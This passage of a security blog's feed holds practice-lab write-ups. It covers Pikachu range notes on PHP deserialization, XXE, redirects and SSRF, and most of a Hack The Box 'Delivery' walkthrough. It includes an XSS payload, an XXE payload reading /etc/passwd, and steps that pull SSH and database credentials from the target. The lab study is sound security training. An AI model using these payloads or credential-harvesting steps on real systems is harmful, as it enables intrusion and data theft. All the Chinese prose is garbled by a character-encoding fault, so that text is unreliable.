&#125;</span><br><span class="line">    $s=new S(); //åˆ›å»ºä¸€ä¸ªå¯¹è±¡</span><br><span class="line">    serialize($s); //æŠŠè¿™ä¸ªå¯¹è±¡è¿›è¡Œåºåˆ—åŒ–</span><br><span class="line">    åºåˆ—åŒ–åå¾—åˆ°çš„ç»“æœæ˜¯è¿™ä¸ªæ ·å­çš„:O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;</span><br><span class="line">        O:ä»£è¡¨object</span><br><span class="line">        1:ä»£è¡¨å¯¹è±¡åå­—é•¿åº¦ä¸ºä¸€ä¸ªå­—ç¬¦</span><br><span class="line">        S:å¯¹è±¡çš„åç§°</span><br><span class="line">        1:ä»£è¡¨å¯¹è±¡é‡Œé¢æœ‰ä¸€ä¸ªå˜é‡</span><br><span class="line">        s:æ•°æ®ç±»å‹</span><br><span class="line">        4:å˜é‡åç§°çš„é•¿åº¦</span><br><span class="line">        test:å˜é‡åç§°</span><br><span class="line">        s:æ•°æ®ç±»å‹</span><br><span class="line">        7:å˜é‡å€¼çš„é•¿åº¦</span><br><span class="line">        pikachu:å˜é‡å€¼</span><br><span class="line">    </span><br><span class="line">ååºåˆ—åŒ–unserialize()</span><br><span class="line">å°±æ˜¯æŠŠè¢«åºåˆ—åŒ–çš„å­—ç¬¦ä¸²è¿˜åŸä¸ºå¯¹è±¡,ç„¶ååœ¨æ¥ä¸‹æ¥çš„ä»£ç ä¸­ç»§ç»­ä½¿ç”¨ã€‚</span><br><span class="line"></span><br><span class="line">    $u=unserialize(&quot;O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;&quot;);</span><br><span class="line">    echo $u-&gt;test; //å¾—åˆ°çš„ç»“æœä¸ºpikachu</span><br><span class="line">    </span><br><span class="line">åºåˆ—åŒ–å’Œååºåˆ—åŒ–æœ¬èº«æ²¡æœ‰é—®é¢˜,ä½†æ˜¯å¦‚æœååºåˆ—åŒ–çš„å†…å®¹æ˜¯ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„,ä¸”åå°ä¸æ­£å½“çš„ä½¿ç”¨äº†PHPä¸­çš„é­”æ³•å‡½æ•°,å°±ä¼šå¯¼è‡´å®‰å…¨é—®é¢˜</span><br><span class="line"></span><br><span class="line">        å¸¸è§çš„å‡ ä¸ªé­”æ³•å‡½æ•°:</span><br><span class="line">        __construct()å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨</span><br><span class="line"></span><br><span class="line">        __destruct()å½“ä¸€ä¸ªå¯¹è±¡é”€æ¯æ—¶è¢«è°ƒç”¨</span><br><span class="line"></span><br><span class="line">        __toString()å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨</span><br><span class="line"></span><br><span class="line">        __sleep() åœ¨å¯¹è±¡åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ</span><br><span class="line"></span><br><span class="line">        __wakeupå°†åœ¨åºåˆ—åŒ–ä¹‹åç«‹å³è¢«è°ƒç”¨</span><br><span class="line"></span><br><span class="line">        æ¼æ´ä¸¾ä¾‹:</span><br><span class="line"></span><br><span class="line">        class S&#123;</span><br><span class="line">            var $test = &quot;pikachu&quot;;</span><br><span class="line">            function __destruct()&#123;</span><br><span class="line">                echo $this-&gt;test;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $s = $_GET[&#x27;test&#x27;];</span><br><span class="line">        @$unser = unserialize($a);</span><br><span class="line"></span><br><span class="line">        payload:O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure><h2 id="0x13-XXE"><a href="#0x13-XXE" class="headerlink" title="0x13.XXE"></a>0x13.XXE</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">XXE -&quot;xml external entity injection&quot;</span><br><span class="line">æ—¢&quot;xmlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´&quot;ã€‚</span><br><span class="line">æ¦‚æ‹¬ä¸€ä¸‹å°±æ˜¯</span><br><span class="line">&quot;æ”»å‡»è€…é€šè¿‡å‘æœåŠ¡å™¨æ³¨å…¥æŒ‡å®šçš„xmlå®ä½“å†…å®¹,ä»è€Œè®©æœåŠ¡å™¨æŒ‰ç…§æŒ‡å®šçš„é…ç½®è¿›è¡Œæ‰§è¡Œ,å¯¼è‡´é—®é¢˜&quot;</span><br><span class="line">ä¹Ÿå°±æ˜¯è¯´æœåŠ¡ç«¯æ¥æ”¶å’Œè§£æäº†æ¥è‡ªç”¨æˆ·ç«¯çš„xmlæ•°æ®,</span><br><span class="line">è€Œåˆæ²¡æœ‰åšä¸¥æ ¼çš„å®‰å…¨æ§åˆ¶,ä»è€Œå¯¼è‡´xmlå¤–éƒ¨å®ä½“æ³¨å…¥ã€‚</span><br><span class="line"></span><br><span class="line">å…·ä½“çš„å…³äºxmlå®ä½“çš„ä»‹ç»,ç½‘ç»œä¸Šæœ‰å¾ˆå¤š,è‡ªå·±åŠ¨æ‰‹å…ˆæŸ¥ä¸€ä¸‹ã€‚</span><br><span class="line">ç°åœ¨å¾ˆå¤šè¯­è¨€é‡Œé¢å¯¹åº”çš„è§£æxmlçš„å‡½æ•°é»˜è®¤æ˜¯ç¦æ­¢è§£æå¤–éƒ¨å®ä½“å†…å®¹çš„,ä»è€Œä¹Ÿå°±ç›´æ¥é¿å…äº†è¿™ä¸ªæ¼æ´ã€‚</span><br><span class="line">ä»¥PHPä¸ºä¾‹,åœ¨PHPé‡Œé¢è§£æxmlç”¨çš„æ˜¯libxml,å…¶åœ¨â‰¥2.9.0çš„ç‰ˆæœ¬ä¸­,é»˜è®¤æ˜¯ç¦æ­¢è§£æxmlå¤–éƒ¨å®ä½“å†…å®¹çš„ã€‚</span><br><span class="line"></span><br><span class="line">æœ¬ç« æä¾›çš„æ¡ˆä¾‹ä¸­,ä¸ºäº†æ¨¡æ‹Ÿæ¼æ´,é€šè¿‡æ‰‹åŠ¨æŒ‡å®šLIBXML_NOENTé€‰é¡¹å¼€å¯äº†xmlå¤–éƒ¨å®ä½“è§£æã€‚</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;  encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE name [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210428085543239.png" class><h2 id="0x14-URLé‡å®šå‘"><a href="#0x14-URLé‡å®šå‘" class="headerlink" title="0x14.URLé‡å®šå‘"></a>0x14.URLé‡å®šå‘</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ä¸å®‰å…¨çš„urlè·³è½¬</span><br><span class="line"></span><br><span class="line">ä¸å®‰å…¨çš„urlè·³è½¬é—®é¢˜å¯èƒ½å‘ç”Ÿåœ¨ä¸€åˆ‡æ‰§è¡Œäº†urlåœ°å€è·³è½¬çš„åœ°æ–¹ã€‚</span><br><span class="line">å¦‚æœåç«¯é‡‡ç”¨äº†å‰ç«¯ä¼ è¿›æ¥çš„(å¯èƒ½æ˜¯ç”¨æˆ·ä¼ å‚,æˆ–è€…ä¹‹å‰é¢„åŸ‹åœ¨å‰ç«¯é¡µé¢çš„urlåœ°å€)å‚æ•°ä½œä¸ºäº†è·³è½¬çš„ç›®çš„åœ°,è€Œåˆæ²¡æœ‰åšåˆ¤æ–­çš„è¯</span><br><span class="line">å°±å¯èƒ½å‘ç”Ÿ&quot;è·³é”™å¯¹è±¡&quot;çš„é—®é¢˜ã€‚</span><br><span class="line"></span><br><span class="line">urlè·³è½¬æ¯”è¾ƒç›´æ¥çš„å±å®³æ˜¯:</span><br><span class="line"><span class="meta">--&gt;</span><span class="bash">é’“é±¼,æ—¢æ”»å‡»è€…ä½¿ç”¨æ¼æ´æ–¹çš„åŸŸå(æ¯”å¦‚ä¸€ä¸ªæ¯”è¾ƒå‡ºåçš„å…¬å¸åŸŸåå¾€å¾€ä¼šè®©ç”¨æˆ·æ”¾å¿ƒçš„ç‚¹å‡»)åšæ©ç›–,è€Œæœ€ç»ˆè·³è½¬çš„ç¡®å®é’“é±¼ç½‘ç«™</span></span><br></pre></td></tr></table></figure><h2 id="0x15-SSRF"><a href="#0x15-SSRF" class="headerlink" title="0x15.SSRF"></a>0x15.SSRF</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ )</span><br><span class="line">å…¶å½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½,ä½†åˆæ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšä¸¥æ ¼è¿‡æ»¤ä¸é™åˆ¶</span><br><span class="line"></span><br><span class="line">å¯¼è‡´æ”»å‡»è€…å¯ä»¥ä¼ å…¥ä»»æ„çš„åœ°å€æ¥è®©åç«¯æœåŠ¡å™¨å¯¹å…¶å‘èµ·è¯·æ±‚,å¹¶è¿”å›å¯¹è¯¥ç›®æ ‡åœ°å€è¯·æ±‚çš„æ•°æ®</span><br><span class="line"></span><br><span class="line">æ•°æ®æµ:æ”»å‡»è€…-----&gt;æœåŠ¡å™¨----&gt;ç›®æ ‡åœ°å€</span><br><span class="line"></span><br><span class="line">æ ¹æ®åå°ä½¿ç”¨çš„å‡½æ•°çš„ä¸åŒ,å¯¹åº”çš„å½±å“å’Œåˆ©ç”¨æ–¹æ³•åˆæœ‰ä¸ä¸€æ ·</span><br><span class="line">PHPä¸­ä¸‹é¢å‡½æ•°çš„ä½¿ç”¨ä¸å½“ä¼šå¯¼è‡´SSRF:</span><br><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br><span class="line">            </span><br><span class="line">å¦‚æœä¸€å®šè¦é€šè¿‡åå°æœåŠ¡å™¨è¿œç¨‹å»å¯¹ç”¨æˆ·æŒ‡å®š(&quot;æˆ–è€…é¢„åŸ‹åœ¨å‰ç«¯çš„è¯·æ±‚&quot;)çš„åœ°å€è¿›è¡Œèµ„æºè¯·æ±‚,åˆ™è¯·åšå¥½ç›®æ ‡åœ°å€çš„è¿‡æ»¤ã€‚</span><br></pre></td></tr></table></figure><h3 id="01-SSRF-curl"><a href="#01-SSRF-curl" class="headerlink" title="01.SSRF(curl)"></a>01.SSRF(curl)</h3><p><code>å¯ä»¥æµ‹å¼€æ”¾çš„ç«¯å£</code></p><img src="/2021/04/28/Pikachu/image-20210428091315523.png" class><h3 id="02-SSRF-file-get-content"><a href="#02-SSRF-file-get-content" class="headerlink" title="02.SSRF(file_get_content)"></a>02.SSRF(file_get_content)</h3><img src="/2021/04/28/Pikachu/image-20210428141007433.png" class>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x01-æš´åŠ›ç ´è§£&quot;&gt;&lt;a href=&quot;#0x01-æš´åŠ›ç ´è§£&quot; class=&quot;headerlink&quot; title=&quot;0x01.æš´åŠ›ç ´è§£&quot;&gt;&lt;/a&gt;0x01.æš´åŠ›ç ´è§£&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Burte Forceï¼ˆæš´åŠ›ç ´è§£ï¼‰æ¦‚è¿°&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;â€œæš´åŠ›ç ´è§£â€æ˜¯ä¸€æ”»å‡»æ‰‹æ®µï¼Œåœ¨webæ”»å‡»ä¸­ï¼Œä¸€èˆ¬ä¼šä½¿ç”¨è¿™ç§æ‰‹æ®µå¯¹åº”ç”¨ç³»ç»Ÿçš„è®¤è¯ä¿¡æ¯è¿›è¡Œè·å–ã€‚ &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;å…¶è¿‡ç¨‹å°±æ˜¯ä½¿ç”¨å¤§é‡çš„è®¤è¯ä¿¡æ¯åœ¨è®¤è¯æ¥å£è¿›è¡Œå°è¯•ç™»å½•ï¼Œç›´åˆ°å¾—åˆ°æ­£ç¡®çš„ç»“æœã€‚ &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ä¸ºäº†æé«˜æ•ˆç‡ï¼Œæš´åŠ›ç ´è§£ä¸€èˆ¬ä¼šä½¿ç”¨å¸¦æœ‰å­—å…¸çš„å·¥å…·æ¥è¿›è¡Œè‡ªåŠ¨åŒ–æ“ä½œã€‚&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ç†è®ºä¸Šæ¥è¯´ï¼Œå¤§å¤šæ•°ç³»ç»Ÿéƒ½æ˜¯å¯ä»¥è¢«æš´åŠ›ç ´è§£çš„ï¼Œåªè¦æ”»å‡»è€…æœ‰è¶³å¤Ÿå¼ºå¤§çš„è®¡ç®—èƒ½åŠ›å’Œæ—¶é—´ï¼Œæ‰€ä»¥æ–­å®šä¸€ä¸ªç³»ç»Ÿæ˜¯å¦å­˜åœ¨æš´åŠ›ç ´è§£æ¼æ´ï¼Œå…¶æ¡ä»¶ä¹Ÿä¸æ˜¯ç»å¯¹çš„ã€‚ &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;æˆ‘ä»¬è¯´ä¸€ä¸ªwebåº”ç”¨ç³»ç»Ÿå­˜åœ¨æš´åŠ›ç ´è§£æ¼æ´ï¼Œä¸€èˆ¬æ˜¯æŒ‡è¯¥webåº”ç”¨ç³»ç»Ÿæ²¡æœ‰é‡‡ç”¨æˆ–è€…é‡‡ç”¨äº†æ¯”è¾ƒå¼±çš„è®¤è¯å®‰å…¨ç­–ç•¥ï¼Œå¯¼è‡´å…¶è¢«æš´åŠ›ç ´è§£çš„â€œå¯èƒ½æ€§â€å˜çš„æ¯”è¾ƒé«˜ã€‚ &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;è¿™é‡Œçš„è®¤è¯å®‰å…¨ç­–ç•¥, åŒ…æ‹¬ï¼š&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;1.æ˜¯å¦è¦æ±‚ç”¨æˆ·è®¾ç½®å¤æ‚çš„å¯†ç ï¼›&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2.æ˜¯å¦æ¯æ¬¡è®¤è¯éƒ½ä½¿ç”¨å®‰å…¨çš„éªŒè¯ç ï¼ˆæƒ³æƒ³ä½ ä¹°ç«è½¦ç¥¨æ—¶è¾“çš„éªŒè¯ç ï½ï¼‰æˆ–è€…æ‰‹æœºotpï¼›&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3.æ˜¯å¦å¯¹å°è¯•ç™»å½•çš„è¡Œä¸ºè¿›è¡Œåˆ¤æ–­å’Œé™åˆ¶ï¼ˆå¦‚ï¼šè¿ç»­5æ¬¡é”™è¯¯ç™»å½•ï¼Œè¿›è¡Œè´¦å·é”å®šæˆ–IPåœ°å€é”å®šç­‰ï¼‰ï¼›&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4.æ˜¯å¦é‡‡ç”¨äº†åŒå› ç´ è®¤è¯ï¼›&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Webé¶åœº" scheme="https://lunamoore.github.io/categories/Web%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="é¶æœº" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>HTB-[delivery]</title>
    <link href="https://lunamoore.github.io/2021/02/04/HTB-delivery/"/>
    <id>https://lunamoore.github.io/2021/02/04/HTB-delivery/</id>
    <published>2021-02-04T03:12:17.000Z</published>
    <updated>2021-02-04T03:18:20.850Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-ç®€è¿°"><a href="#0x00-ç®€è¿°" class="headerlink" title="0x00.ç®€è¿°"></a>0x00.ç®€è¿°</h2><img src="/2021/02/04/HTB-delivery/image-20210203224703300.png" class><a id="more"></a><h2 id="0x01-ä¿¡æ¯æ”¶é›†"><a href="#0x01-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01.ä¿¡æ¯æ”¶é›†"></a>0x01.ä¿¡æ¯æ”¶é›†</h2><p><code>åªå¼€æ”¾äº†22ä¸80ç«¯å£</code></p><blockquote><p>æ·»åŠ ä¸¤æ¡hostsæ–‡ä»¶</p><p>10.10.10.222    helpdesk.delivery.htb<br>10.10.10.222    delivery.htb</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/delivery# nmap -sC -sV -sT 10.10.10.222 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-03 16:27 EST</span><br><span class="line">Nmap scan report for helpdesk.delivery.htb (10.10.10.222)</span><br><span class="line">Host is up (0.34s latency).</span><br><span class="line">Not shown: 965 closed ports, 33 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)</span><br><span class="line">|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)</span><br><span class="line">|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.14.2</span><br><span class="line">|_http-server-header: nginx/1.14.2</span><br><span class="line">|_http-title: delivery</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 100.17 seconds</span><br><span class="line">root@JIYE:~/htb/delivery#</span><br></pre></td></tr></table></figure><h2 id="0x02-è®¿é—®80ç«¯å£"><a href="#0x02-è®¿é—®80ç«¯å£" class="headerlink" title="0x02.è®¿é—®80ç«¯å£"></a>0x02.è®¿é—®80ç«¯å£</h2><p><code>å‘ç°äºé‚®ä»¶ç›¸å…³</code></p><img src="/2021/02/04/HTB-delivery/image-20210203225046353.png" class><p><code>æ‰‹åŠ¨çˆ¬è™«å‘ç°ä¸¤ä¸ªæœ‰ç”¨é“¾æ¥å¦‚ä¸‹</code></p><blockquote><p>ç¬¬ä¸€ä¸ªä¸ºä¸€ä¸ªè®¡ç¥¨ç³»ç»Ÿ</p></blockquote><img src="/2021/02/04/HTB-delivery/image-20210203225320648.png" class><blockquote><p>ç¬¬äºŒä¸ªä¸ºæä¾›MatterMostæœåŠ¡</p></blockquote><img src="/2021/02/04/HTB-delivery/image-20210203225437119.png" class><blockquote><p>ç‚¹å‡»MatterMost serverè·³è½¬åˆ°å¦‚ä¸‹é¡µé¢ï¼Œå¯ä»¥ç™»å…¥æ³¨å†Œ</p></blockquote><img src="/2021/02/04/HTB-delivery/image-20210203225641859.png" class><h2 id="0x03-æäº¤è¡¨å•è¿›è¡Œæµ‹è¯•"><a href="#0x03-æäº¤è¡¨å•è¿›è¡Œæµ‹è¯•" class="headerlink" title="0x03.æäº¤è¡¨å•è¿›è¡Œæµ‹è¯•"></a>0x03.æäº¤è¡¨å•è¿›è¡Œæµ‹è¯•</h2><p><code>æäº¤</code></p><img src="/2021/02/04/HTB-delivery/image-20210203225931140.png" class><p><code>å¾—åˆ°ticket id 6285564ä¸é‚®ç®±6285564@delivery.htb</code></p><img src="/2021/02/04/HTB-delivery/image-20210203230847316.png" class><p><code>æäº¤å®Œæˆä¹‹åå¯ä»¥è¿›è¡ŒçŠ¶æ€æŸ¥è¯¢</code></p><img src="/2021/02/04/HTB-delivery/image-20210203231322565.png" class><p><code>å¯ä»¥çœ‹åˆ°çŠ¶æ€å¦‚ä¸‹</code></p><img src="/2021/02/04/HTB-delivery/image-20210203231357635.png" class><h2 id="0x04-é‚®ç®±åˆ©ç”¨MasterMost"><a href="#0x04-é‚®ç®±åˆ©ç”¨MasterMost" class="headerlink" title="0x04.é‚®ç®±åˆ©ç”¨MasterMost"></a>0x04.é‚®ç®±åˆ©ç”¨MasterMost</h2><p><code>ä½¿ç”¨6285564@delivery.htbæ³¨å†ŒMasterMost</code></p><img src="/2021/02/04/HTB-delivery/image-20210203231611322.png" class><p><code>å†æ¬¡æŸ¥çœ‹çŠ¶æ€ï¼Œå¯ä»¥çœ‹åˆ°åˆšåˆšçš„é‚®ä»¶æ¿€æ´»è¿æ¥</code></p><img src="/2021/02/04/HTB-delivery/image-20210203231908206.png" class><h2 id="0x05-æ¿€æ´»ç™»å…¥"><a href="#0x05-æ¿€æ´»ç™»å…¥" class="headerlink" title="0x05.æ¿€æ´»ç™»å…¥"></a>0x05.æ¿€æ´»ç™»å…¥</h2><p><code>ç‚¹å‡»å¦‚ä¸‹è¿æ¥</code></p><blockquote><p><span class="exturl" data-url="aHR0cDovL2RlbGl2ZXJ5Lmh0Yjo4MDY1L2RvX3ZlcmlmeV9lbWFpbD90b2tlbj1qb3JwMWtrZnJxaGtneDl3b3FhM3o5ZGszM2h3aHhyaGhvem9uMXNzdW10dGplcHA2bW1iOHE5OWF5aXQ4aWRxJmFtcDtlbWFpbD02Mjg1NTY0QGRlbGl2ZXJ5Lmh0Yg==">http://delivery.htb:8065/do_verify_email?token=jorp1kkfrqhkgx9woqa3z9dk33hwhxrhhozon1ssumttjepp6mmb8q99ayit8idq&amp;email=6285564%40delivery.htb<i class="fa fa-external-link-alt"></i></span></p></blockquote><img src="/2021/02/04/HTB-delivery/image-20210203232040991.png" class><p><code>åŠ å…¥å›¢é˜Ÿ</code></p><img src="/2021/02/04/HTB-delivery/image-20210203232228472.png" class><p><code>å¾—åˆ°ç”¨æˆ·åä¸å¯†ç </code></p><blockquote><p>maildeliverer:Youve_G0t_Mail! </p></blockquote><img src="/2021/02/04/HTB-delivery/image-20210203232549365.png" class><p><code>ç™»å…¥å¾—åˆ°flag</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# ssh maildeliverer@10.10.10.222</span><br><span class="line">The authenticity of host &#x27;10.10.10.222 (10.10.10.222)&#x27; can&#x27;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:LKngIDlEjP2k8M7IAUkAoFgY/MbVVbMqvrFA6CUrHoM.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;10.10.10.222&#x27; (ECDSA) to the list of known hosts.</span><br><span class="line">maildeliverer@10.10.10.222&#x27;s password: </span><br><span class="line">Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Wed Feb  3 10:27:44 2021 from 10.10.14.55</span><br><span class="line">maildeliverer@Delivery:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">maildeliverer@Delivery:~$ cat user.txt </span><br><span class="line">******************************</span><br><span class="line">maildeliverer@Delivery:~$</span><br></pre></td></tr></table></figure><h2 id="0x06-ææƒ"><a href="#0x06-ææƒ" class="headerlink" title="0x06.ææƒ"></a>0x06.ææƒ</h2><p><code>è¿™é‡ŒæŸ¥çœ‹rootè¯´çš„ä¸¤å¥è¯</code></p><blockquote><p>ç¬¬ä¸€ä¸ªå¯èƒ½å­˜åœ¨ä¸PleaseSubscribe!ç±»ä¼¼çš„å¯†ç </p></blockquote><img src="/2021/02/04/HTB-delivery/image-20210203234447237.png" class><blockquote><p>ç¬¬äºŒä¸ªå¯ä»¥ä½¿ç”¨hashcatï¼Œè¿›è¡Œç±»å‹å¯†ç çš„æšä¸¾ã€‚</p><p>æç¤ºäº†è¿™ä¹ˆå¤šï¼Œå¯ä»¥å¼€æäº†ã€‚</p></blockquote><img src="/2021/02/04/HTB-delivery/image-20210203234610886.png" class><p><code>æŸ¥çœ‹mattermostçš„é…ç½®æ–‡ä»¶</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">maildeliverer@Delivery:/tmp$ find / -name mattermost &gt; list</span><br><span class="line">maildeliverer@Delivery:/tmp$ cat list </span><br><span class="line">/opt/mattermost</span><br><span class="line">/opt/mattermost/bin/mattermost</span><br><span class="line">/var/lib/mysql/mattermost</span><br></pre></td></tr></table></figure><p><code>æœ€ç»ˆæ‰¾åˆ°é…ç½®æ–‡ä»¶ä½ç½®</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">maildeliverer@Delivery:/opt/mattermost/config$ ls</span><br><span class="line">cloud_defaults.json  config.json  README.md</span><br></pre></td></tr></table></figure><p><code>æ‰¾åˆ°æ•°æ®åº“çš„é…ç½®æ–‡ä»¶å¦‚ä¸‹</code></p><blockquote><p>æ•°æ®åº“ä¸ºmysql</p><p>ç”¨æˆ·åä¸å¯†ç ä¸ºmmuser:Crack_The_MM_Admin_PW</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&quot;SqlSettings&quot;: &#123;</span><br><span class="line">        &quot;DriverName&quot;: &quot;mysql&quot;,</span><br><span class="line">        &quot;DataSource&quot;: 